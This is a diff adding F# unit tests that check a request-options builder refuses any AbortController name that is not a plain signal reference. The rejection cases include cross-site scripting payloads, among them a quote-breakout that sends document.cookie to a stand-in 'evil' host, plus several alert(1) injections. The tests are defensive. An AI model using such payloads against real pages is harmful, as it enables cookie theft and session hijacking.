@@ -133,6 +133,56 @@ module RequestOptionsTests =
         let error = Assert.Throws<ArgumentException>(fun () -> Ds.post ("/a", { RequestOptions.Defaults with RequestCancellation = AbortController " " }) |> ignore)
         error.Message |> should equal """RequestOptions.RequestCancellation is AbortController without a name. Write the signal that holds the controller, for example AbortController "$controller", or use Auto."""
 
+    // The AbortController name goes into the page as code, not as text, so anything but a signal reference would run in the browser.
+    // A signal reference is one or more dollars, then parts made of letters, digits and underscores, separated by dots.
+
+    [<Fact>]
+    let ``RequestOptions AbortController accepts a signal reference`` () =
+        for name in [ "$controller"; "$_controller"; "$form.controller"; "$_form._controller" ] do
+            Ds.post ("/a", { RequestOptions.Defaults with RequestCancellation = AbortController name })
+            |> should equal $"""@post('/a',{{&quot;requestCancellation&quot;:{name}}})"""
+
+    [<Fact>]
+    let ``RequestOptions AbortController that is not a signal reference says what to write`` () =
+        let notReferences =
+            [ // A quote ends the JavaScript, so the rest of it would run as code
+              "$ctl'||fetch('//evil/'+document.cookie)||'"
+              "$ctl\";alert(1);//"
+              "$ctl;alert(1)"
+              "$ctl+1"
+              // Not a signal at all
+              "new AbortController()"
+              "controller"
+              "$ctl-controller"
+              "$1"
+              "$ctl['x']"
+              "$"
+              "$$" ]
+        for name in notReferences do
+            let error = Assert.Throws<ArgumentException>(fun () -> Ds.post ("/a", { RequestOptions.Defaults with RequestCancellation = AbortController name }) |> ignore)
+            error.Message |> should haveSubstring "It is written into the page as code, so it has to be the name of a signal"
+
+    [<Fact>]
+    let ``RequestOptions AbortController that has whitespace around it says what to write`` () =
+        // A name that is blank says it has no name at all, and one with whitespace only on the ends is refused as a signal reference
+        Assert.Throws<ArgumentException>(fun () -> Ds.post ("/a", { RequestOptions.Defaults with RequestCancellation = AbortController " " }) |> ignore)
+        |> ignore
+        let error = Assert.Throws<ArgumentException>(fun () -> Ds.post ("/a", { RequestOptions.Defaults with RequestCancellation = AbortController "$ctl " }) |> ignore)
+        error.Message |> should haveSubstring "It is written into the page as code, so it has to be the name of a signal"
+
+    [<Fact>]
+    let ``RequestOptions AbortController does not let a quote out of the attribute`` () =
+        // Nothing of the given text reaches the page as code, so there is nothing to break out of
+        let options = { RequestOptions.Defaults with RequestCancellation = AbortController "$ctl\";alert(1);//" }
+        let error = Assert.Throws<ArgumentException>(fun () -> Ds.post ("/a", options) |> ignore)
+        error.Message |> should haveSubstring "It is written into the page as code"
+
+    [<Fact>]
+    let ``RequestOptions CustomJson of null sends a JSON null payload`` () =
+        // Serializing null gives no node, so the payload is written as null rather than raising NullReferenceException
+        Ds.post ("/a", { RequestOptions.Defaults with ContentType = CustomJson null })
+        |> should equal """@post('/a',{&quot;contentType&quot;:&quot;json&quot;,&quot;payload&quot;:null})"""
+
     [<Fact>]
     let ``RequestOptions RetryScaler that is not a number says what to write`` () =
         let error = Assert.Throws<ArgumentException>(fun () -> Ds.get ("/a", { RequestOptions.Defaults with RetryScaler = nan }) |> ignore)
